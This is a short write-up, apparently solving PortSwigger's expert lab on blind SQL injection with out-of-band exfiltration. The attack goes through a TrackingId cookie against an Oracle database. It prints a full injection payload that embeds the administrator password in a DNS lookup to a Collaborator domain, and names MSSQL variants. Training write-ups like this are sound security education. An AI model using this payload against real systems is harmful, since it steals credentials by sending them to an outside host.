# Lab 16 — Blind SQL injection with out-of-band data exfiltration

> **Expert** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

**Entry point:** `TrackingId` cookie · **DB:** Oracle · **Tool:** Burp Collaborator

## Goal

Exfiltrate the `administrator` password **through the requested DNS
subdomain** — one interaction carries the whole secret.

## Solution

1. Same setup as lab 15, but the exfiltrated data is concatenated into the
   entity's hostname. Inject (single line, **fully URL-encoded**):

```
TrackingId: xyz' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"
encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM
"http://'||(SELECT password FROM users WHERE username='administrator')||
'.abc123.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

(replace `abc123.oastify.com` with your Collaborator domain)

2. **Poll now** in Collaborator. The DNS interaction list shows a lookup of:

```
<administrator-password>.abc123.oastify.com
```

The subdomain **is** the password (20 chars) — read it from the
interaction details.

3. Log in as `administrator` — lab solved.

## Notes

- DNS labels are case-insensitive but preserve everything else; the password
  here is alphanumeric, so it survives the round trip.
- This is why Collaborator monitors DNS, not just HTTP: the data never needs
  an HTTP request to leave.
- On Windows/MSSQL the same trick uses `xp_dirtree` / `fn_xe_file_target_read_file`.
